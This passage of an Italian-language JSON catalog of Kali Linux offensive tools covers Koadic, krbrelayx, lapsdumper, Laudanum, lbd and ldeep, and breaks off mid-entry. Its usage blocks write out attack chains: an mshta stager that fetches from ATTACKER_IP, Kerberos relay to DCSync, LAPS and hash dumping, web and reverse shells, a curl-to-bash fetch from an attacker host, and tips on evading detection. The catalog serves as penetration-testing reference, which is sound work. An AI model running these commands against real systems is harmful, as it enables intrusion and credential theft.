    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Koadic</strong> (COM Command & Control) è un framework C2 post-exploitation per Windows che utilizza esclusivamente Windows Script Host (JScript e VBScript) e COM objects nativi per tutte le operazioni. A differenza di tool basati su PowerShell (spesso pesantemente monitorati), Koadic sfrutta MSHTA, WScript, CScript, e Rundll32 per eseguire payload, offrendo un approccio Living-off-the-Land che usa solo componenti Windows legittimi. L'implant è completamente fileless - non scrive binari su disco ma opera interamente in memoria tramite script. Il framework include stager multipli per delivery iniziale (HTA, JS, VBS, SCT), un sistema di implant persistente, e moduli per tutte le fasi di post-exploitation: enumeration, credential harvesting, lateral movement, persistence, e privilege escalation. L'architettura supporta operatori multipli simultanei con gestione centralizzata degli zombie (host compromessi).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Living-off-the-Land Execution:</strong> Ogni operazione usa componenti Windows nativi: MSHTA per eseguire HTA, WScript/CScript per JScript/VBScript, Rundll32 per chiamate COM. Questi processi sono trusted e spesso whitelisted. Non richiede PowerShell, riducendo il profilo di detection in ambienti con PowerShell monitoring.</p><p><strong>Multiple Stager Options:</strong> Diversi metodi per delivery iniziale: mshta (URL to HTA), regsvr32 (SCT file), certutil (download and execute), bitsadmin (background transfer), diskpeel (persistence via COM hijack). Ogni stager ha diverso profilo di detection e funziona in scenari differenti.</p><p><strong>Comprehensive Post-Exploitation Modules:</strong> Include moduli per: credential dumping (SAM, LSASS, browser passwords), enumeration (users, groups, network, software), lateral movement (WMI, DCOM, PSExec-like), persistence (scheduled task, registry, COM hijack), privilege escalation (UAC bypass, service manipulation), e file operations.</p><p><strong>Zombie Management:</strong> Gli host compromessi ('zombies') sono gestiti centralmente. Ogni zombie ha un ID univoco e può ricevere comandi individualmente o in gruppo. Status monitoring, heartbeat configurable, e auto-reconnect se la connessione cade.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO ===\n# Avvia console Koadic\nkoadic\n# Oppure\npython3 koadic\n\n# === STAGER SETUP ===\n# Lista stager disponibili\n(koadic)> stagers\n\n# Usa stager MSHTA (comune e affidabile)\n(koadic)> use stager/js/mshta\n(koadic)> info\n(koadic)> set SRVPORT 8080\n(koadic)> set SRVHOST 0.0.0.0\n(koadic)> run\n\n# Koadic mostra il comando da eseguire sul target:\n# mshta http://ATTACKER_IP:8080/random.hta\n\n# Altri stager\n(koadic)> use stager/js/regsvr32\n(koadic)> use stager/js/bitsadmin\n(koadic)> use stager/js/certutil\n\n# === GESTIONE ZOMBIES ===\n# Lista zombies connessi\n(koadic)> zombies\n\n# Interagisci con zombie specifico\n(koadic)> zombies 0\n\n# Esegui comando su zombie\n(koadic)> cmdshell 0 whoami\n\n# === POST-EXPLOITATION MODULES ===\n# Lista implant disponibili\n(koadic)> implants\n\n# Credential dumping\n(koadic)> use implant/gather/hashdump_sam\n(koadic)> set ZOMBIE 0\n(koadic)> run\n\n# Mimikatz integration\n(koadic)> use implant/inject/mimikatz_dotnet2js\n\n# Enumeration\n(koadic)> use implant/gather/user\n(koadic)> use implant/gather/computer\n(koadic)> use implant/gather/network\n\n# Persistence\n(koadic)> use implant/persist/registry\n(koadic)> use implant/persist/schtasks\n\n# Lateral movement\n(koadic)> use implant/pivot/wmi\n(koadic)> use implant/pivot/dcom\n\n# UAC Bypass\n(koadic)> use implant/elevate/bypassuac_fodhelper\n\n# === FILE OPERATIONS ===\n# Upload file\n(koadic)> use implant/manage/upload_file\n(koadic)> set LFILE /local/path/to/file\n(koadic)> set RFILE C:\\\\Users\\\\Public\\\\file.exe\n(koadic)> run\n\n# Download file\n(koadic)> use implant/manage/download_file\n\n# === SESSION MANAGEMENT ===\n# Kill zombie specifico\n(koadic)> kill 0\n\n# Exit mantenendo listener\n(koadic)> back\n\n# Exit completamente\n(koadic)> exit</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team Operations in Ambienti PowerShell-Restricted</strong>, quando PowerShell è bloccato, monitorato, o in Constrained Language Mode, Koadic offre un'alternativa efficace. Usa Windows Script Host che è meno comunemente disabilitato e meno intensivamente monitorato in molte organizzazioni.</p><p>Durante <strong>Fileless Post-Exploitation</strong>, l'approccio completamente in-memory di Koadic evita detection basata su file. Non vengono scritti binari su disco (eccetto per alcune operazioni specifiche), riducendo la superficie per antivirus e EDR basati su scanning.</p><p>Nel <strong>Penetration Testing Windows</strong>, Koadic fornisce un framework completo per post-exploitation dopo aver ottenuto esecuzione di codice iniziale. I moduli coprono tutte le fasi: dal credential dumping alla persistence, dal lateral movement alla privilege escalation.</p><p>Per <strong>Testing Detection Capabilities</strong>, Koadic usa tecniche diverse da tool più comuni, permettendo di verificare se le difese rilevano anche approcci MSHTA/JScript-based oltre a PowerShell. Utile per gap analysis della detection coverage.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>MSHTA/WScript Monitoring:</strong> Sebbene meno monitorato di PowerShell, MSHTA che carica HTA da URL remote è comunque sospetto. EDR moderni monitorano processi script che fanno network connections o spawano child processes. Sysmon Event ID 1 traccia tutte le esecuzioni.</p><p><strong>Network C2 Traffic:</strong> Le comunicazioni Koadic sono HTTP/HTTPS ma con pattern riconoscibili. Il polling interval, i path URL, e i pattern di traffic sono signature-abili. Considerare proxy chaining o domain fronting per operazioni sensibili.</p><p><strong>Known Signatures:</strong> Koadic esiste da anni e le sue signature sono nei database di molti vendor security. Payload di default possono essere rilevati. Customizzazione e obfuscation possono essere necessari per evadere detection.</p><p><strong>COM Object Abuse:</strong> L'uso estensivo di COM objects può generare eventi distintivi. CreateObject() calls frequenti da processi script, accesso a oggetti COM inusuali, e pattern di interazione con ActiveX sono tutti indicatori potenziali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "krbrelayx",
    "name": "krbrelayx",
    "version": "0.0~git20250127.aef69a7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/krbrelayx/",
    "desc": "Relay e abuse di Kerberos per attacchi unconstrained delegation e S4U2Self.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Krbrelayx</strong> è un toolkit avanzato per sfruttare misconfigurazioni di Kerberos delegation in Active Directory. Kerberos delegation permette ai servizi di agire per conto degli utenti verso altri servizi - quando mal configurata, può essere abusata per impersonare qualsiasi utente, inclusi Domain Admin. Krbrelayx copre tre scenari principali: Unconstrained Delegation (cattura TGT di utenti che si connettono), Constrained Delegation con S4U2Self/S4U2Proxy (impersonation senza interazione dell'utente), e Resource-Based Constrained Delegation (RBCD) abuse. Include anche tool per DNS manipulation necessaria in alcuni attacchi. Questi attacchi rappresentano alcuni dei path più potenti verso Domain Admin in ambienti AD moderni dove Kerberoasting e password spray non funzionano.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Unconstrained Delegation Exploitation:</strong> Quando un server ha Unconstrained Delegation, gli utenti che si autenticano verso di esso inviano il loro TGT completo. Krbrelayx cattura questi TGT permettendo di impersonare qualsiasi utente che si connette. Combinato con coercion attacks (PrinterBug, PetitPotam), può forzare Domain Controller a connettersi e rilasciare il loro TGT.</p><p><strong>S4U2Self/S4U2Proxy Attacks:</strong> Service for User (S4U) extensions permettono a un servizio con Constrained Delegation di ottenere ticket per altri servizi. S4U2Self ottiene un ticket per qualsiasi utente (anche se non si autentica), S4U2Proxy lo usa verso i servizi target. Krbrelayx automatizza questa chain per impersonation.</p><p><strong>RBCD (Resource-Based Constrained Delegation):</strong> RBCD può essere configurata da chi controlla l'oggetto target. Se puoi modificare msDS-AllowedToActOnBehalfOfOtherIdentity, puoi autorizzare un computer che controlli a impersonare utenti verso quel target. Krbrelayx configura e sfrutta questo scenario.</p><p><strong>DNS Manipulation:</strong> Alcuni attacchi richiedono che l'attacker abbia un record DNS che punta al suo IP. Krbrelayx include dnstool.py per aggiungere/modificare record DNS quando le condizioni lo permettono (authenticated users di default possono creare nuovi record in AD).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === UNCONSTRAINED DELEGATION ATTACK ===\n# Prerequisito: controllo di un server con Unconstrained Delegation\n# oppure capacità di creare un record DNS che punta all'attacker\n\n# Step 1: Aggiungi DNS record per attacker machine\ndnstool.py -u 'domain\\user' -p password -a add -t A -d ATTACKER_IP \\\n  -r evilhost.domain.com dc.domain.com\n\n# Step 2: Avvia listener krbrelayx\nkrbrelayx.py -hashes :NTLMHASH\n\n# Step 3: Trigger coercion dal DC (PrinterBug)\nprinterbug.py domain/user:password@dc.domain.com evilhost.domain.com\n\n# Oppure PetitPotam\nPetitPotam.py evilhost.domain.com dc.domain.com\n\n# Step 4: krbrelayx cattura il TGT del DC\n# Appare come: [*] Got TGT for DC$@DOMAIN.COM\n\n# Step 5: Usa il TGT per DCSync\nexport KRB5CCNAME=DC\\$.ccache\nsecretsdump.py -k -no-pass dc.domain.com\n\n# === RBCD ATTACK ===\n# Prerequisito: GenericWrite/GenericAll su un computer object\n# o WriteProperty su msDS-AllowedToActOnBehalfOfOtherIdentity\n\n# Step 1: Crea un computer account (se non hai già un machine account)\naddcomputer.py domain.com/user:password -computer-name EVIL$ -computer-pass 'EvilPass123'\n\n# Step 2: Configura RBCD sul target\nrbcd.py -delegate-from EVIL$ -delegate-to TARGET$ domain/user:pass -dc-ip DC_IP\n\n# Step 3: Ottieni ticket impersonando admin verso target\ngetST.py -spn cifs/target.domain.com -impersonate Administrator \\\n  domain.com/EVIL$:EvilPass123\n\n# Step 4: Usa ticket\nexport KRB5CCNAME=Administrator.ccache\nsmbexec.py -k -no-pass target.domain.com\n\n# === S4U2SELF/S4U2PROXY ===\n# Se hai hash di un account con Constrained Delegation\n# verso specifici servizi\n\n# Step 1: Identifica account con delegation\nfindDelegation.py domain.com/user:password\n\n# Step 2: S4U per impersonare admin verso servizio permesso\ngetST.py -spn mssql/target.domain.com -impersonate Administrator \\\n  -hashes :SERVICE_ACCOUNT_HASH domain.com/svc_sql\n\n# Step 3: Usa ticket per accesso al servizio\nexport KRB5CCNAME=Administrator.ccache\nmssqlclient.py -k target.domain.com\n\n# === SHADOWCREDS (bonus) ===\n# Se hai GenericWrite su un computer object\npywhisker.py -d domain.com -u user -p password --target TARGET$ --action add\n# Poi usa il certificato generato per autenticazione</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Domain Compromise via Unconstrained Delegation</strong>, questo è uno dei path più diretti a Domain Admin. Se riesci a forzare un DC a connettersi a un server con Unconstrained Delegation che controlli (o che puoi impersonare via DNS), ottieni il TGT del DC e puoi fare DCSync per tutti gli hash del dominio.</p><p>Durante <strong>Lateral Movement via RBCD</strong>, se hai write access a un computer object (comune con ACL misconfiguration), puoi configurare RBCD per permettere a un computer che controlli di impersonare qualsiasi utente verso quel target. Non richiede privilegi elevati, solo specifici diritti sull'oggetto.</p><p>Nel <strong>Privilege Escalation con Constrained Delegation</strong>, service account con Constrained Delegation verso servizi sensibili (MSSQL, CIFS, HTTP) possono essere abusati per impersonare admin verso quei servizi. Se cracchi o ottieni l'hash di questi account, puoi impersonare chiunque.</p><p>Per <strong>AD Security Assessment</strong>, verificare la configurazione delegation è critico. Krbrelayx permette di testare se le delegation sono exploitable e dimostrare l'impatto di misconfigurazioni comuni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Kerberos Ticket Events:</strong> Ogni S4U operation genera specifici eventi Kerberos nel DC. Event 4768 (TGT request), 4769 (TGS request), e specificamente events per S4U2Self. Impersonation genera anche 4624 con logon type che può essere sospetto.</p><p><strong>DNS Modifications:</strong> Aggiungere record DNS con dnstool è loggato. Il record DNS rimane visibile e può essere rilevato come anomalo (nuovo record che punta a IP esterno o insolito).</p><p><strong>Coercion Detection:</strong> PrinterBug e PetitPotam generano connessioni anomale dal DC verso altri sistemi. Queste connessioni sono monitorate da soluzioni avanzate. Richiede che SMB/RPC siano raggiungibili.</p><p><strong>RBCD Changes:</strong> Modifiche a msDS-AllowedToActOnBehalfOfOtherIdentity sono loggate e facilmente rilevabili. L'attributo non è comunemente modificato in operazioni normali.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "lapsdumper",
    "name": "lapsdumper",
    "version": "0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/lapsdumper/",
    "desc": "Estrae password LAPS (Local Admin Password Solution) da Active Directory via LDAP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LAPSDumper</strong> è uno strumento Python per estrarre password LAPS (Local Administrator Password Solution) da Active Directory. LAPS è una soluzione Microsoft che gestisce automaticamente le password dell'amministratore locale su ogni computer del dominio, generando password uniche e casuali che vengono memorizzate in attributi LDAP del computer object (ms-Mcs-AdmPwd per LAPS legacy, ms-LAPS-Password per Windows LAPS). L'accesso a questi attributi è controllato tramite ACL - tipicamente solo gli IT admin hanno permessi di lettura. Tuttavia, misconfigurazioni comuni (permessi eccessivi, group membership ereditate) possono permettere a utenti con privilegi limitati di leggere queste password. LAPSDumper automatizza la query LDAP per estrarre tutte le password LAPS accessibili con le credenziali fornite, identificando potenziali escalation paths verso accesso admin locale su workstation e server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LAPS Password Extraction:</strong> Query LDAP per leggere l'attributo ms-Mcs-AdmPwd (LAPS legacy) o ms-LAPS-Password (Windows LAPS/LAPS 2.0) da tutti i computer objects accessibili. Restituisce computer name e password in chiaro. Supporta autenticazione con password, hash NTLM, o Kerberos ticket.</p><p><strong>Bulk and Targeted Dump:</strong> Può estrarre password per tutti i computer nel dominio (limitato dai permessi dell'utente) o targetizzare specifici computer/OU. Utile per identificare esattamente dove l'utente compromesso ha accesso admin locale.</p><p><strong>Windows LAPS Support:</strong> Windows LAPS (la versione moderna) usa un formato diverso e può anche criptare le password. LAPSDumper supporta entrambi i formati e può decifrare password Windows LAPS se le credenziali hanno i permessi appropriati.</p><p><strong>Permission Verification:</strong> Identifica quali computer hanno LAPS configurato e per quali l'utente corrente può leggere la password. Questo aiuta a mappare l'accesso effettivo anche se non si ottengono tutte le password.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === BASIC LAPS DUMP ===\n# Dump tutte le password LAPS accessibili\nlapsdumper -u user -p password -d domain.com\n\n# Specificare Domain Controller\nlapsdumper -u user -p password -d domain.com -l dc.domain.com\n\n# === AUTENTICAZIONE ===\n# Con hash NTLM (pass-the-hash)\nlapsdumper -u user -H NTHASH:NTHASH -d domain.com\n\n# Con Kerberos (ticket già in cache)\nexport KRB5CCNAME=/tmp/user.ccache\nlapsdumper -k -d domain.com\n\n# === QUERY SPECIFICHE ===\n# Computer specifico\nlapsdumper -u user -p pass -d domain.com -c WORKSTATION01\n\n# Tutti i computer che iniziano con 'SRV'\nlapsdumper -u user -p pass -d domain.com -c 'SRV*'\n\n# Computer in OU specifica\nlapsdumper -u user -p pass -d domain.com -o 'OU=Servers,DC=domain,DC=com'\n\n# === ALTERNATIVE CON LDAPSEARCH ===\n# Query manuale con ldapsearch\nldapsearch -x -H ldap://dc.domain.com -D 'user@domain.com' -w 'password' \\\n  -b 'DC=domain,DC=com' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd\n\n# === CON IMPACKET ===\n# Get-LAPSPassword.py\nGet-LAPSPassword.py domain.com/user:password -dc-ip DC_IP\n\n# === POST-EXPLOITATION ===\n# Usa password estratta per accesso locale\nsmbexec.py domain.com/Administrator:'LAPSPassword123'@workstation\n\n# O crackmapexec per accesso massivo\ncrackmapexec smb targets.txt -u Administrator -p 'LAPSPassword123' --local-auth\n\n# Attenzione: LAPS genera password diverse per ogni computer!\n# Ogni accesso richiede la password specifica di quel computer</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Privilege Escalation Locale</strong>, se l'utente compromesso ha permessi di lettura LAPS (spesso per errore o inheritance), puoi ottenere accesso admin locale a workstation e server. Questo è particolarmente utile quando l'utente normale non ha altri privilegi elevati.</p><p>Durante <strong>Lateral Movement</strong>, a differenza di password admin condivise, LAPS genera password uniche per ogni computer. Devi leggere la password specifica per ogni target. Questo rende il movimento laterale più metodico ma anche più tracciabile.</p><p>Nel <strong>Active Directory Security Assessment</strong>, verificare chi può leggere password LAPS è critico. Spesso i permessi sono configurati su OU ma ereditati da utenti o gruppi che non dovrebbero averli. LAPSDumper rivela l'impatto reale di queste misconfigurazioni.</p><p>Per <strong>Post-Compromise Recovery Testing</strong>, dopo un breach, verificare se l'attaccante poteva accedere a password LAPS aiuta a determinare il blast radius. Se poteva leggere LAPS, potenzialmente aveva admin locale su tutti quei sistemi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>LDAP Query Logging:</strong> Le query LDAP verso attributi LAPS possono essere loggate, specialmente in ambienti con auditing avanzato. Microsoft consiglia di monitorare accessi a ms-Mcs-AdmPwd. Query massive per tutti i computer sono sospette.</p><p><strong>Permission Requirements:</strong> Leggere LAPS richiede permessi specifici (ReadProperty su ms-Mcs-AdmPwd). Non tutti gli utenti possono farlo. Un tentativo di lettura senza permessi genera errore ma l'accesso può comunque essere loggato.</p><p><strong>Windows LAPS Encryption:</strong> Windows LAPS può criptare le password in AD. In questo caso, anche leggendo l'attributo serve la chiave per decifrare. I permessi di decryption sono separati dalla lettura.</p><p><strong>Credential Exposure:</strong> Usare le password LAPS estratte genera eventi di login sui target. Ogni uso di una password LAPS è tracciabile nei Security logs del computer target come login Administrator locale.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "laudanum",
    "name": "laudanum",
    "version": "1.0",
    "icon": "../app/icons/laudanum-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/laudanum/",
    "desc": "Collezione di web shell in ASP, ASPX, JSP, PHP per vari scenari di post-exploitation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Laudanum</strong> è una collezione storica e completa di web shell pronte all'uso per ogni major web technology stack: PHP, ASP/ASPX (IIS), JSP (Java), CFM (ColdFusion). Ogni linguaggio include multiple varianti di shell con diverse funzionalità: command execution semplice, file browser con upload/download, reverse shell, proxy per tunneling, e shell con autenticazione. Le shell sono progettate per essere relativamente compatte (facilitando upload via form con size limit), funzionali (features complete per post-exploitation), e facili da customizzare (parametri configurabili per IP, porta, password). Inclusa in Kali Linux come pacchetto pronto all'uso, Laudanum è un toolkit essenziale per qualsiasi penetration tester che lavora con vulnerabilità di file upload o accesso in scrittura a web server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Language Coverage:</strong> Shell complete per PHP (il più comune), ASP Classic e ASPX (.NET), JSP (Java application server), e CFM (ColdFusion). Qualunque sia il technology stack del target, Laudanum ha una shell appropriata pronta.</p><p><strong>Variety of Shell Types:</strong> Per ogni linguaggio include: cmd shell (semplice esecuzione comandi), file browser (navigazione filesystem con upload/download), reverse shell (connessione outbound all'attacker), proxy (per tunneling traffico attraverso il server), DNS shell (comandi via query DNS). Scegli il tipo appropriato per lo scenario.</p><p><strong>Authentication Option:</strong> Alcune shell includono meccanismo di autenticazione (password o IP whitelist) per evitare che altri attaccanti o crawler le scoprano e usino. Critico per operazioni che durano nel tempo.</p><p><strong>Compact Design:</strong> Le shell sono ottimizzate per dimensioni ridotte pur mantenendo funzionalità. Importante quando i form di upload hanno limit sulla dimensione dei file o quando si devono evitare detection basate su file size anomali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === LOCATION IN KALI ===\nls -la /usr/share/laudanum/\n# Sottodirectory per linguaggio:\n# /usr/share/laudanum/php/\n# /usr/share/laudanum/aspx/\n# /usr/share/laudanum/asp/\n# /usr/share/laudanum/jsp/\n# /usr/share/laudanum/cfm/\n\n# === PHP SHELLS ===\n# Command shell semplice\ncp /usr/share/laudanum/php/shell.php .\n# Dopo upload: http://target/uploads/shell.php?cmd=id\n\n# File browser PHP\ncp /usr/share/laudanum/php/file.php .\n# Interfaccia grafica per file browsing\n\n# Reverse shell PHP\ncp /usr/share/laudanum/php/php-reverse-shell.php .\n# Modifica $ip e $port nel file\nnano php-reverse-shell.php\n# Avvia listener e triggera\nnc -lvnp 4444\n\n# === ASPX SHELLS (.NET/IIS) ===\n# Command shell ASPX\ncp /usr/share/laudanum/aspx/shell.aspx .\n# http://target/shell.aspx?cmd=whoami\n\n# File browser ASPX\ncp /usr/share/laudanum/aspx/file.aspx .\n\n# === JSP SHELLS (Java) ===\n# Command shell JSP\ncp /usr/share/laudanum/jsp/cmd.jsp .\n# http://target/cmd.jsp?cmd=id\n\n# Reverse shell JSP\ncp /usr/share/laudanum/jsp/reverseshell.jsp .\n# Modifica ATTACKER_IP e PORT\n\n# === ASP CLASSIC (Legacy IIS) ===\n# Command shell ASP\ncp /usr/share/laudanum/asp/cmd.asp .\n\n# === CUSTOMIZATION ===\n# Rinomina per sembrare legittimo\ncp shell.php admin_config.php\ncp shell.aspx settings.aspx\n\n# Aggiungi autenticazione (per shell che la supportano)\n# Modifica variabile $password nel file\n\n# === POST-EXPLOITATION ===\n# Dopo aver ottenuto shell, uploada tool aggiuntivi\ncurl http://attacker/linpeas.sh > /tmp/lp.sh && bash /tmp/lp.sh\n\n# Pivot verso rete interna\n# Usa proxy shell per tunneling</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>File Upload Exploitation</strong>, quando si scopre una vulnerabilità di file upload che permette di caricare file eseguibili, Laudanum fornisce shell immediatamente pronte per ogni technology stack senza dover scrivere codice custom.</p><p>Per <strong>Web Application Penetration Testing</strong>, dopo aver ottenuto write access a un web server (via vulnerabilità, credenziali, o misconfigurazione), le shell Laudanum stabiliscono rapidamente una presenza persistente.</p><p>Nel <strong>Pivoting Through Web Server</strong>, il server web compromesso diventa punto di pivot per accedere alla rete interna. Le proxy shell permettono di tunnelare traffico, mentre le command shell esplorano la rete circostante.</p><p>Durante <strong>Capture The Flag (CTF)</strong>, avere shell pronte per ogni linguaggio accelera significativamente il tempo di exploitation quando si trova una vulnerability di file upload.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>AV/EDR Detection:</strong> Le shell Laudanum sono note e i loro hash/pattern sono nei database di molti antivirus. Windows Defender, ClamAV, e WAF con signature possono bloccarle. Considerare modifica del codice o obfuscation per evadere detection.</p><p><strong>Persistent Disk Artifact:</strong> A differenza di shell in-memory, le web shell restano su disco come file. Scansioni di file integrity, antivirus periodici, o review manuale le troveranno. Rimuovere dopo uso o usare nomi che sembrano legittimi.</p><p><strong>Access Log Footprint:</strong> Ogni accesso alla shell appare nei log del web server (access.log). I parametri GET con comandi sono particolarmente visibili. Preferire POST requests dove possibile per ridurre visibilità nei log.</p><p><strong>Web Application Firewall:</strong> WAF moderni hanno regole per rilevare pattern di web shell: eval(), base64_decode(), exec(), system() nei file uploadati o nelle request. Potrebbero essere necessarie tecniche di evasion.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "lbd",
    "name": "lbd",
    "version": "0.4",
    "icon": "../app/icons/lbd-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/lbd/",
    "desc": "Rileva load balancer e WAF analizzando differenze nelle risposte HTTP multiple.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LBD</strong> (Load Balancing Detector) è uno strumento di reconnaissance progettato per identificare la presenza di load balancer, reverse proxy e WAF nell'infrastruttura web di un target. Effettuando richieste HTTP multiple e analizzando le sottili differenze nelle risposte (header, timestamp, cookie, server signature), determina se il traffico viene distribuito tra più backend server. Questa informazione è fondamentale per pianificare attacchi che richiedono persistenza su un singolo server o per identificare punti deboli nell'architettura.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>DNS-Based Detection:</strong> Risolve il dominio multiple volte per identificare se esistono più record A che puntano a IP diversi (DNS round-robin), la forma più semplice di load balancing.</p><p><strong>HTTP Header Analysis:</strong> Confronta header come Server, X-Powered-By, Date, e header custom tra risposte successive. Variazioni indicano backend server diversi o load balancer che modificano le risposte.</p><p><strong>Server Fingerprinting:</strong> Identifica differenze nelle signature dei web server (Apache vs nginx, versioni diverse) che rivelano un pool di backend eterogeneo dietro il load balancer.</p><p><strong>Cookie & Session Analysis:</strong> Analizza i cookie di sessione e gli identificatori di backend (come JSESSIONID, PHPSESSID, o cookie sticky session) che molti load balancer inseriscono per mantenere l'affinità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>LBD è uno script bash semplice che richiede solo il dominio target come parametro.</p><pre><code># Detection standard\nlbd target.com\n\n# Output tipico:\n# Checking for DNS-Load-Balancing: NOT FOUND\n# Checking for HTTP-Load-Balancing [Server]: \n#   Apache/2.4.41 (Ubuntu)\n#   Apache/2.4.41 (Ubuntu)\n# NOT FOUND\n#\n# Checking for HTTP-Load-Balancing [Date]: 11:25:34, 11:25:35\n# FOUND\n#\n# target.com does Load-balancing. Found via Methods: HTTP[Date]\n\n# Per risultati più affidabili, eseguire più volte\nfor i in {1..5}; do lbd target.com; sleep 2; done</code></pre><p>L'output indica chiaramente quale metodo di detection ha identificato il load balancing e fornisce dettagli sui server backend quando possibile.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>Reconnaissance</strong>, LBD rivela la complessità dell'infrastruttura target. Sapere che esistono multiple istanze backend influenza la strategia di attacco e le aspettative sui risultati.</p><p>Per <strong>Session Hijacking</strong> e attacchi che richiedono persistenza, è essenziale sapere se le richieste potrebbero finire su server diversi, invalidando token o session state.</p><p>Nel <strong>WAF Bypass Planning</strong>, identificare un load balancer può rivelare opportunità: alcuni backend potrebbero avere configurazioni WAF diverse o più permissive.</p><p>Per <strong>Vulnerability Assessment</strong>, se i backend server hanno versioni software diverse, potrebbero avere vulnerabilità diverse - testare uno non garantisce la sicurezza di tutti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> LBD genera solo traffico HTTP standard indistinguibile da navigazione normale. Non invia payload sospetti, non esegue fuzzing, non tenta exploit. Il pattern di richieste ripetute potrebbe essere notato solo da sistemi di analisi comportamentale molto sofisticati.</p><p><strong>Impatto:</strong> Nullo. Le richieste sono leggere e non causano carico significativo sul target.</p><p><strong>Limitazioni:</strong> Load balancer sofisticati possono mascherare completamente la loro presenza normalizzando tutti gli header delle risposte. La detection non è garantita al 100% in ambienti enterprise con configurazioni avanzate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "WAF"
    ],
    "notes": null
  },
  {
    "id": "ldeep",
    "name": "ldeep",
    "version": "1.0.87",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ldeep/",
    "desc": "Tool LDAP per enumerazione AD: utenti, gruppi, GPO, trust, delegation e ACL.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LDeep</strong> è uno strumento Python avanzato per l'enumerazione LDAP di Active Directory, progettato per estrarre sistematicamente informazioni utili per penetration testing e security assessment. A differenza di tool generici LDAP, LDeep conosce la struttura AD e sa esattamente quali attributi e oggetti sono interessanti per un attacker: utenti con descrizioni contenenti password, account con delegation configurata, gruppi privilegiati e loro membri, relazioni di trust, GPO, e ACL permissive. Supporta autenticazione con password, hash NTLM, e ticket Kerberos. Una feature distintiva è la modalità 'cache': può salvare tutti i risultati LDAP in JSON e poi analizzarli offline, permettendo di raccogliere dati velocemente dal target e analizzarli senza ulteriori connessioni. Include anche capacità di esportazione in formati utili per BloodHound e altri tool di analisi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive User Enumeration:</strong> Estrae tutti gli attributi utili degli utenti: descrizione (spesso contiene password hint), ultimo logon, password age, account status (disabled, locked), memberOf per tutti i gruppi. Identifica account con password never expires, accounts non usati da tempo, e admin accounts.</p><p><strong>Privileged Groups Analysis:</strong> Enumera membri di gruppi privilegiati: Domain Admins, Enterprise Admins, Schema Admins, Backup Operators, Account Operators, e altri gruppi che conferiscono accesso elevato. Include nested membership per vedere l'effective access.</p><p><strong>Delegation Detection:</strong> Trova account con delegation configurata: Unconstrained Delegation (qualsiasi servizio può essere impersonato), Constrained Delegation (solo verso servizi specifici), Resource-Based Constrained Delegation. Questi sono target primari per privilege escalation.</p><p><strong>Trust Relationship Mapping:</strong> Enumera trust con altri domini e forest, identificando la direzione del trust e tipo. Trust esterni e forest trust sono interessanti per cross-domain attacks.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AUTENTICAZIONE ===\n# Con password\nldeep ldap -u user -p password -d domain.com -s dc.domain.com [command]\n\n# Con hash NTLM\nldeep ldap -u user -H NTHASH -d domain.com -s dc.domain.com [command]\n\n# Con Kerberos ticket\nKRB5CCNAME=/tmp/ticket.ccache ldeep ldap -k -d domain.com -s dc.domain.com [command]\n\n# === USER ENUMERATION ===\n# Tutti gli utenti\nldeep ldap -u user -p pass -d domain.com -s dc users\n\n# Utenti con dettagli (descrizione, ultimo logon)\nldeep ldap -u user -p pass -d domain.com -s dc users -v\n\n# Utenti con 